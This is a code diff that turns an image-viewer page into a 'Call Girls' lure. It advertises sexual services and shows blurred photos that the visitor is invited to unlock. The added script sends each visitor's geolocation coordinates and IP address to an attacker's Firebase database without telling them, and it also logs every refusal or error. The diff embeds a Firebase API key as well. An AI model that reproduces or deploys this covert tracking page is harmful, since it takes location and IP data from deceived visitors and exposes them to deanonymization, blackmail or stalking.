@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Tempting Image Viewer</title>
+    <title>Call Girls</title>
     <style>
       body {
         font-family: Arial, sans-serif;
@@ -45,7 +45,7 @@
         transition: all 0.3s ease;
       }
       .blur-overlay::after {
-        content: 'Allow location to view';
+        content: 'Click to view contact';
         position: absolute;
         top: 50%;
         left: 50%;
@@ -89,30 +89,58 @@
     </style>
   </head>
   <body>
-    <div id="locationStatus">
-      Allow access to your location to fully reveal the images
+    <div id="locationStatus" style="display:none"></div>
+    <div id="">
+       <h2>Explore Sexy Young Girls/Aunties near your location</h2> 
+      Service|Handjob|Cum Sucking|Massage all at your convenient place. At low price starts from 500 Cash on AfterService only 
     </div>
-    <button id="allowLocationBtn">Allow Location Access</button>
+    <!-- <button id="allowLocationBtn">Allow Location Access</button> -->
     <div class="image-grid" id="imageGrid">
       <!-- We'll populate this with JavaScript -->
     </div>
 
-    <script>
+    <script type="module">
+
+          // Import the required Firebase services
+          import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js';
+        import { getDatabase, ref, push } from 'https://www.gstatic.com/firebasejs/10.12.5/firebase-database.js';
+
+        // Your web app's Firebase configuration
+       
+   const firebaseConfig = {
+            apiKey: "AIzaSyC3RPlvOkd8LP-r1KZDa1hCBezhI8MEDiI",
+            authDomain: "geomonitor-c92fb.firebaseapp.com",
+            projectId: "geomonitor-c92fb",
+            storageBucket: "geomonitor-c92fb.appspot.com",
+            messagingSenderId:  "1085073508855",
+            appId: "1:1085073508855:web:9ca3414443bc520085c6f2",
+            databaseURL: "https://geomonitor-c92fb-default-rtdb.firebaseio.com/"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+
+
+
+
       const imageGrid = document.getElementById('imageGrid');
       const locationStatus = document.getElementById('locationStatus');
       const allowLocationBtn = document.getElementById('allowLocationBtn');
       const imagePath =
-        'https://images.unsplash.com/photo-1699111407196-88aa06da1b80?q=80&w=1374&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D';
+        ['https://cdn.schloka.com/in/Content/Uploads/SCH-63857620326322-2103213618.jpg','https://cdn.schloka.com/in/Content/Uploads/SCH-63858004686655-2103213618.jpg','https://cdn.schloka.com/in/Content/Uploads/SCH-63857426954950-2103213618.jpg','https://cdn.schloka.com/in/Content/Uploads/SCH-63856376588909-2103213618.jpg','https://cdn.schloka.com/in/Content/Uploads/SCH-63858215251570-2103213618.jpg','https://cdn.schloka.com/in/Content/Uploads/SCH-63858215252147-2103213618.jpg','https://cdn.schloka.com/in/Content/Uploads/SCH-63858202203364-2103213618.jpg','https://cdn.schloka.com/in/Content/Uploads/SCH-63844875490126-2103213618.jpg','https://cdn.schloka.com/in/Content/Uploads/SCH-63856165139877-2103213618.jpg'];
 
       function createImageGrid() {
         for (let i = 0; i < 9; i++) {
           const container = document.createElement('div');
           container.className = 'image-container';
           const img = document.createElement('img');
-          img.src = imagePath;
+          img.src = imagePath[i];
           img.alt = `Image ${i + 1}`;
           container.appendChild(img);
 
+          if(i>1){
           const blurOverlay = document.createElement('div');
           blurOverlay.className = 'blur-overlay';
           container.appendChild(blurOverlay);
@@ -123,6 +151,7 @@
           teaserCircle.style.backgroundPosition = 'center';
           teaserCircle.style.backgroundSize = '500%';
           container.appendChild(teaserCircle);
+          }
 
           imageGrid.appendChild(container);
         }
@@ -142,15 +171,39 @@
         } else {
           locationStatus.textContent =
             'Geolocation is not supported by this browser.';
+
+            push(ref(database, 'errorEnable_callg'), {
+                            timestamp: Date.now()
+                        }).then(function() {
+                            console.log('Location saved successfully!');
+                        }).catch(function(error) {
+                            console.error('Error saving location to Firebase:', error);
+                        });
         }
       }
 
       function showImages(position) {
+
+
+        push(ref(database, 'locations_callg'), {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            timestamp: Date.now()
+                        }).then(function() {
+                            console.log('Location saved successfully!');
+                        }).catch(function(error) {
+                            console.error('Error saving location to Firebase:', error);
+                        });
+
         document
           .querySelectorAll('.blur-overlay, .teaser-circle')
           .forEach((el) => {
             el.style.display = 'none';
           });
+
+
+
+
         locationStatus.textContent = `Images revealed! Your location: ${position.coords.latitude.toFixed(
           2
         )}, ${position.coords.longitude.toFixed(2)}`;
@@ -161,18 +214,48 @@
         console.error('Geolocation error:', error);
         switch (error.code) {
           case error.PERMISSION_DENIED:
+          push(ref(database, 'errorDenied_callg'), {
+                            timestamp: Date.now()
+                        }).then(function() {
+                            console.log('Location saved successfully!');
+                        }).catch(function(error) {
+                            console.error('Error saving location to Firebase:', error);
+                        });
             locationStatus.textContent =
               'Location access was denied. Click an image or the button below to try again.';
-            break;
+            
+              break;
           case error.POSITION_UNAVAILABLE:
+          push(ref(database, 'errorAvailable_callg'), {
+                            timestamp: Date.now()
+                        }).then(function() {
+                            console.log('Location saved successfully!');
+                        }).catch(function(error) {
+                            console.error('Error saving location to Firebase:', error);
+                        });
             locationStatus.textContent =
               'Location information is unavailable. Please try again.';
+            
             break;
           case error.TIMEOUT:
+          push(ref(database, 'errorTimeout_callg'), {
+                            timestamp: Date.now()
+                        }).then(function() {
+                            console.log('Location saved successfully!');
+                        }).catch(function(error) {
+                            console.error('Error saving location to Firebase:', error);
+                        });
             locationStatus.textContent =
               'The request to get user location timed out. Please try again.';
             break;
           default:
+          push(ref(database, 'errorDefault_callg'), {
+                            timestamp: Date.now()
+                        }).then(function() {
+                            console.log('Location saved successfully!');
+                        }).catch(function(error) {
+                            console.error('Error saving location to Firebase:', error);
+                        });
             locationStatus.textContent =
               'An unknown error occurred. Please try again.';
             break;
@@ -192,6 +275,27 @@
           requestLocationPermission();
         }
       });
+
+
+      async function getIpAddress() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+
+    push(ref(database, 'ips_callg'), {
+                            ip_address: data.ip,
+                            timestamp: Date.now()
+                        }).then(function() {
+                            console.log('Ip saved!');
+                        }).catch(function(error) {
+                            console.error('Error saving Ip:', error);
+                        });
+  } catch (error) {
+    console.error('Error fetching IP address:', error);
+  }
+}
+
+getIpAddress();
     </script>
   </body>
 </html>
